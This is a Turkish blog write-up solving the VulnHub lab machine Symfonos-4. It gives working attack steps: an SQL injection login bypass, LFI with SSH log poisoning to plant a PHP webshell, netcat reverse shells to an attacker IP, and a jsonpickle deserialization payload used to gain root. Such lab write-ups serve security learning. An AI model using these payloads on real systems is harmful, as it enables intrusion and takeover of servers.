---
title: "VULNHUB Symfonos-4 Write Up"
date: 2020-11-22T20:45:07+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,Lfi,socat,Port Forwarding,sqlinjection,jsonpickle,Insecure Deserialization,] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [Vulnhub](https://www.vulnhub.com/entry/symfonos-4,347/) 'da yer alan Symfonos-4  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/symfonos4/cover.png
  
---
*Merhaba, Bu yazımda sizlere [Vulnhub](https://www.vulnhub.com/entry/symfonos-4,347/) 'da yer alan Symfonos-4  adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...*

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```
netdiscover -i eth1
```

{{< image src="/images/vulnhub/symfonos4/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}


Nmap ile port ve servis taraması yapılır.
```bash
sudo nmap -sV -sC -p- 192.168.56.123
```
{{< image src="/images/vulnhub/symfonos4/nmap.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

80 portunda çalışan web servisi ile keşif aşamasına devam edilir.

{{< image src="/images/vulnhub/symfonos4/website.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Gobuster ile dizin taraması yapılır.

```
gobuster dir -u http://192.168.56.123/ 
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 50
```

{{< image src="/images/vulnhub/symfonos4/gobuster2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

**/gods** dizinine bakıldığında .log uzantılı dosyalar görülmektedir. İçerisine bakıldığında karakterler hakkında bilgiler verilmektedir.

{{< image src="/images/vulnhub/symfonos4/gods.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

**sea.php** sayfasına yapılan istekte 302 (Yönlendirme) kodu döndüğü görülmektedir. sea.php dosyasına istek atıldığında sayfanın **atlantis.php** sayfasına yönlendirilmektedir. Bu sayfada login paneli yer almaktadır.

{{< image src="/images/vulnhub/symfonos4/login.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Sayfada ilk olarak sql injection açğının varlığı test edilmeye çalışılır. Username ve password olarak  `' or 1=1#` girilir. İnjection işlemi başarılı olduğundan sistem giriş yapılır.

{{< image src="/images/vulnhub/symfonos4/success.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Sayfanın kaynak kodları incelendiğinde ***?file=xxxx*** parametreleri LFI açığının olduğunu göstermektedir.

{{< image src="/images/vulnhub/symfonos4/lfi.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Açılır listeden hades kullanıcısı seçildiğinde ***/gods/hades.log*** dosyasının sayfaya import edildiği görülmektedir.

{{< image src="/images/vulnhub/symfonos4/hades.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Dosya adı parametre olarak verilirken .log uzantısı otomatik olarak eklenmektedir. *Log poisoning* için log dosyaları okunmaya çalışılır. İlk olarak ***/var/log/auth.log*** dosyası test edilir. 
<br>
```txt
http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth
```
<br>
{{< image src="/images/vulnhub/symfonos4/authlog2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

*Auth.log içerisinde ssh bağlantısına ait erişim logları görülmektedir. Ssh bağlantısı yapılmaya çalışıldığında işlem logları bu dosyaya kayıt edilmektedir.*

*Sömürme işlemine bakacak olursak, **Ssh** kullanıcı adı olarak zararlı php kodu verilerek bağlantı sağlanmaya çalışıldığında, php kodu auth.log dosyasına eklenir. Daha sonra lfi zafiyeti ile auth.log dosyası çağırıldığında php kodları yorumlanarak zararlı kod çalıştırılır.*

```txt
ssh '<?php system($_GET['cmd']); ?>'@192.168.56.123
```
cmd parametresi ile gönderilen komutlar sistemde çalıştırılaracaktır. `id` komutu ile test gerçekleştirilir.

```txt
http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth&cmd=id
```
<br>
{{< image src="/images/vulnhub/symfonos4/sshlfi.png" alt="Hay aksi" position="center" style="border-radius: 2px;" >}}

Reverse bağlantı için sistemde netcat aracının varlığının tespit edilir.

```txt
http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth&cmd=which nc
```

{{< image src="/images/vulnhub/symfonos4/nc.png" alt="Hay aksi" position="center" style="border-radius: 2px;" >}}

## 2. Erişim Sağlanması

Sistemde `netcat` uygulamasının olduğu görülmektedir. Netcat bağlantısı için ilgili parametreler gönderilir.
```txt
http://192.168.56.123/sea.php?file=../../../../../../../../var/log/auth
&cmd=nc -e /bin/bash 192.168.56.105 3333
```
3333 numaralı porta shell bağlantısı düşmektedir.

{{< image src="/images/vulnhub/symfonos4/shell.png" alt="Hay aksi" position="center" style="border-radius: 2px;" >}}

*/opt* dizini altında code dizini yer almaktadır. İçerisine bakıldığında *python flask framework* ile yazılmış bir web uygulaması görümektedir.

```txt
www-data@symfonos4:/opt/code$ ls -lsa
ls -lsa
total 28
4 drwxr-xrwx 4 root root 4096 Aug 19  2019 .
4 drwxr-xr-x 3 root root 4096 Aug 18  2019 ..
4 -rw-r--r-- 1 root root  942 Aug 19  2019 app.py
4 -rw-r--r-- 1 root root 1536 Aug 19  2019 app.pyc
4 drwxr-xr-x 4 root root 4096 Aug 19  2019 static
4 drwxr-xr-x 2 root root 4096 Aug 19  2019 templates
4 -rw-r--r-- 1 root root  215 Aug 19  2019 wsgi.pyc
```

app.py dosya içeriği incelenir.

```python
from flask import Flask, request, render_template, current_app, redirect

import jsonpickle
import base64

app = Flask(__name__)

class User(object):

    def __init__(self, username):
        self.username = username


@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Poseidon")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response


@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)


if __name__ == '__main__':
    app.run()
```
Kod incelendiğinde cookie bilgisinin decode edildiği görülmektedir. OWASP-10'da yer alan *Insecure Deserialization* zafiyeti yer almaktadır. Pythonda json verilerini serileştimek için kullanılan ***jsonpickle*** kütüphanesi hakkında yapılan araştırma zafiyet olduğu görülmektedir. *([Daha Fazla Bilgi İçin](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/))* Bu zafiyet, gönderilen payload ile uygulama üzerinde çalıştırılabilir nesneler oluşturulabilmeyi sağlamaktadır.

Web uygulamasının çalışıp çalışmadığını bilinmediğinden bilgi toplamaya devam edilir. LinEnum.sh betiği çalıştırılarak sistemde bilgi toplanır. Ağ istatistiklerine bakıldığında ***8080*** portunda çalışan bir uygulama olduğu görülmektedir.

{{< image src="/images/vulnhub/symfonos4/netstat.png" alt="Hay aksi" position="center" style="border-radius: 2px;" >}}

Daha sonra çalışan processler incelendiğinde *root* yetkisi ile python http server uygulaması olan *Gunicorn* ile 8080 portundan yayın yapıldığı görülmektedir.


{{< image src="/images/vulnhub/symfonos4/server.png" alt="Hay aksi" position="center" style="border-radius: 2px;" >}}


8080 portuna dışarıdan erişim için port yönlendirme yapılması gerekmektedir. **Socat** aracı ile port yönlendirme yapılır.

 Aşağıda yer alan kod kısaca 8090 portunu dışarı açar ve porta gelen bağlantıları 8080 portuna yönlendirmektedir(kopyalamaktadır).

```txt
socat TCP-LISTEN:8090,fork TCP:127.0.0.1:8080
```
Tarayıcı üzerinden 8090 portuna erişim sağlanır.

{{< image src="/images/vulnhub/symfonos4/web.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Sayfada yer alan main page linkine tıklanır.

{{< image src="/images/vulnhub/symfonos4/web2.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

## 3. Yetki Yükseltme

Çalışan uygulamanın yukarıda kaynak kod analizi yapılan uygulama olduğu görülmektedir. *Aşağıda yer alan json verisi base64 ile encode edilir ve cookie bilgisi olarak tarayıcı üzerinden set edilir.* Sayfa yenilendiğinde 4444 numaralı porta shell bağlantısı sağlanır.

```json
{"py/object": "__main__.Shell", "py/reduce": [{"py/type": "os.system"},
 {"py/tuple": ["nc -e /bin/bash 192.168.56.105 4444"]}, null, null, null]}
```
<br>
{{< image src="/images/vulnhub/symfonos4/root.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

Root dizini altında yer alan proof.txt dosyası okunarak işlem tamamlanır.

{{< image src="/images/vulnhub/symfonos4/flag.png" alt="Hay aksi" position="center" style="border-radius: 6px;" >}}

*Umarım faydalı olmuştur. Başka bir çözümde görüşmek üzere Allah’a emanet olun…*

